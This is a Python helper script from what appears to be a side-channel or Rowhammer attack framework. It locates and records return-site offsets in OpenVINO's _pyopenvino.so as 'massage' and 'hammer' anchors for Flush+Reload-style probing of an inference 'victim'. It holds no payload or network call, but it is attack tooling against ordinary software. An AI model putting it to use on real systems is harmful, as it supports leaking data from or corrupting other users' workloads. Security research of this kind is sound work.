#!/usr/bin/env python3
"""F+R return-site offsets in _pyopenvino.so."""

from __future__ import annotations

import argparse
import json
import platform
import sys
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from framework.env import igpu_victim_env, ov251_python  # noqa: E402
from framework.symbols import (  # noqa: E402
    find_bp2_set_input_tensor_caller_side_candidates,
    find_openvino_create_infer_request_caller_side_candidates,
)


PREFERRED_CIR_CALL = 0x1106A3
PREFERRED_SIT_RET = 0x125C43


def resolve_pyopenvino_so(explicit: str | None = None, python: Path | None = None) -> Path:
    if explicit:
        path = Path(explicit)
        if not path.is_file():
            raise SystemExit(f"missing {path}")
        return path
    import subprocess

    py = Path(python) if python is not None else ov251_python()
    out = subprocess.check_output(
        [
            str(py),
            "-c",
            "import pathlib, openvino; "
            "print((pathlib.Path(openvino.__file__).parent / "
            "'_pyopenvino.cpython-311-x86_64-linux-gnu.so').as_posix())",
        ],
        env=igpu_victim_env(),
        text=True,
    ).strip()
    path = Path(out)
    if not path.is_file():
        raise SystemExit(f"missing pyopenvino {path}")
    return path


def massage_offset_for_so(so_path: Path, anchors: dict | None = None) -> int:
    """Return-site offset of create_infer_request for this exact SO."""
    if anchors and "massage" in anchors:
        off = int(anchors["massage"]["file_offset"])
        want = str(anchors["massage"].get("validated_bytes") or "")
        got = read_bytes(so_path, off)
        listed = Path(str(anchors.get("so_path") or ""))
        if want and got == want and listed.as_posix() == so_path.as_posix():
            return off
    sites = find_openvino_create_infer_request_caller_side_candidates(str(so_path))
    off, _, _ = pick_cir_return(sites)
    return off


def hammer_offset_for_so(so_path: Path, anchors: dict | None = None) -> int:
    """Return-site offset of set_input_tensor for this exact SO."""
    if anchors and "hammer" in anchors:
        off = int(anchors["hammer"]["file_offset"])
        want = str(anchors["hammer"].get("validated_bytes") or "")
        got = read_bytes(so_path, off)
        listed = Path(str(anchors.get("so_path") or ""))
        if want and got == want and listed.as_posix() == so_path.as_posix():
            return off
    sites = find_bp2_set_input_tensor_caller_side_candidates(str(so_path))
    off, _, _ = pick_sit_return(sites)
    return off


def read_bytes(so_path: Path, offset: int, nbytes: int = 8) -> str:
    data = so_path.read_bytes()
    if offset < 0 or offset + nbytes > len(data):
        return ""
    return data[offset : offset + nbytes].hex()


def pick_cir_return(sites: list[tuple[int, str]]) -> tuple[int, str, list[int]]:
    calls = list(sites)
    if not calls:
        raise SystemExit("no create_infer_request caller sites")
    ordered = sorted(
        calls,
        key=lambda item: (0 if int(item[0]) == PREFERRED_CIR_CALL else 1, int(item[0])),
    )
    call_off, desc = ordered[0]
    ret = int(call_off) + 5
    fallbacks = [int(off) + 5 for off, _ in ordered[1:4]]
    return ret, f"ret-from {desc} (call {hex(int(call_off))})", fallbacks


def pick_sit_return(sites: list[tuple[int, str]]) -> tuple[int, str, list[int]]:
    if not sites:
        raise SystemExit("no set_input_tensor return sites")
    ordered = sorted(
        sites,
        key=lambda item: (0 if int(item[0]) == PREFERRED_SIT_RET else 1, int(item[0])),
    )
    ret, desc = ordered[0]
    fallbacks = [int(off) for off, _ in ordered[1:4]]
    return int(ret), desc, fallbacks


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--pyopenvino-so", default=None)
    ap.add_argument(
        "--output",
        default=str(ROOT / "anchors" / "memmap_fr_anchors.json"),
    )
    args = ap.parse_args()
    so_path = resolve_pyopenvino_so(args.pyopenvino_so)
    if not so_path.is_file():
        raise SystemExit(f"missing {so_path}")

    cir = find_openvino_create_infer_request_caller_side_candidates(str(so_path))
    sit = find_bp2_set_input_tensor_caller_side_candidates(str(so_path))
    massage_off, massage_desc, massage_fb = pick_cir_return(cir)
    hammer_off, hammer_desc, hammer_fb = pick_sit_return(sit)

    try:
        import subprocess

        ov_version = subprocess.check_output(
            [str(ov251_python()), "-c", "import openvino; print(openvino.__version__)"],
            env=igpu_victim_env(),
            text=True,
        ).strip()
    except Exception:
        ov_version = "unknown"

    out = {
        "so_path": str(so_path),
        "openvino_version": ov_version,
        "python_version": platform.python_version(),
        "massage": {
            "role": "massage",
            "symbol": "CompiledModel::create_infer_request",
            "anchor_kind": "caller_return_site",
            "lifecycle_point": "after_CIR_before_weight_bind",
            "file_offset": massage_off,
            "file_offset_hex": hex(massage_off),
            "cacheline_file_offset": massage_off & ~0x3F,
            "validated_bytes": read_bytes(so_path, massage_off),
            "description": massage_desc,
            "single_fire": True,
            "fallback_offsets": massage_fb,
        },
        "hammer": {
            "role": "hammer",
            "symbol": "InferRequest::set_input_tensor",
            "anchor_kind": "caller_return_site",
            "lifecycle_point": "after_set_input_tensor_before_infer",
            "file_offset": hammer_off,
            "file_offset_hex": hex(hammer_off),
            "cacheline_file_offset": hammer_off & ~0x3F,
            "validated_bytes": read_bytes(so_path, hammer_off),
            "description": hammer_desc,
            "single_fire": True,
            "fallback_offsets": hammer_fb,
        },
    }
    dest = Path(args.output)
    dest.parent.mkdir(parents=True, exist_ok=True)
    dest.write_text(json.dumps(out, indent=2) + "\n", encoding="utf-8")
    print(f"wrote {dest}")
    print(f"massage ret {hex(massage_off)}  {massage_desc}")
    print(f"hammer  ret {hex(hammer_off)}  {hammer_desc}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
